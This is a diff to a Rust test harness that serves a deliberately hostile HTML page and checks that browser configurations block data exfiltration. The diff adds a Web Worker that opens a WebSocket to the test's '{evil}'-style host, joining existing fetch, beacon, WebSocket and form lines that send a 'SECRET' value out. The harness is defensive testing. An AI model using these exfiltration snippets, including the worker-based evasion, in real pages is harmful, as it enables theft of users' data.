@@ -13,8 +13,8 @@ use serde_json::{json, Value};
 
 type Log = Arc<Mutex<Vec<String>>>;
 
-const CHANNELS: [&str; 8] = [
-    "form", "img", "fetch", "ws", "beacon", "ping", "prefetch", "frame",
+const CHANNELS: [&str; 9] = [
+    "form", "img", "fetch", "ws", "beacon", "ping", "prefetch", "frame", "wkws",
 ];
 
 fn serve(evil: &str) -> (String, Log) {
@@ -53,6 +53,7 @@ fn serve(evil: &str) -> (String, Log) {
 <script>
 fetch("{evil}/fetch", {{method: "POST", body: "SECRET"}}).catch(function () {{}});
 try {{ var w = new WebSocket("{ws}/ws?d=SECRET"); w.onopen = function () {{ w.send("SECRET"); }}; w.onerror = function () {{}}; }} catch (e) {{}}
+try {{ var wsrc = "var s=new WebSocket('{ws}/wkws?d=SECRET');s.onopen=function(){{s.send('SECRET')}};s.onerror=function(){{}};"; new Worker(URL.createObjectURL(new Blob([wsrc], {{type: "text/javascript"}}))); }} catch (e) {{}}
 try {{ navigator.sendBeacon("{evil}/beacon", "SECRET"); }} catch (e) {{}}
 </script>
 <form method="post" action="{evil}/form"><input name="d" value="SECRET"><button id="p">Post out</button></form>
@@ -217,7 +218,7 @@ fn arm(name: &str, chrome: bool, grants: bool) -> Vec<(&'static str, usize)> {
         .collect();
     let blocked = counts.iter().filter(|(_, n)| *n == 0).count();
     let line = format!(
-        "{name}\tchrome_ver=145.0.7632.116\tblocked={blocked}/8\t{}",
+        "{name}\tchrome_ver=145.0.7632.116\tblocked={blocked}/9\t{}",
         counts
             .iter()
             .map(|(c, n)| format!("{c}={n}"))
@@ -236,7 +237,7 @@ fn arm(name: &str, chrome: bool, grants: bool) -> Vec<(&'static str, usize)> {
 }
 
 #[test]
-fn engine_arm_blocks_all_eight_channels() {
+fn engine_arm_blocks_all_nine_channels() {
     let c = arm("manuk-granted", false, true);
     assert!(c.iter().all(|(_, n)| *n == 0), "engine arm leaked: {c:?}");
 }
@@ -251,7 +252,7 @@ fn open_arm_leaks_so_the_fixture_can_go_red() {
 }
 
 #[test]
-fn cdp_layer_arm_blocks_all_eight_channels() {
+fn cdp_layer_arm_blocks_all_nine_channels() {
     let c = arm("chrome-granted", true, true);
     assert!(c.iter().all(|(_, n)| *n == 0), "cdp arm leaked: {c:?}");
 }
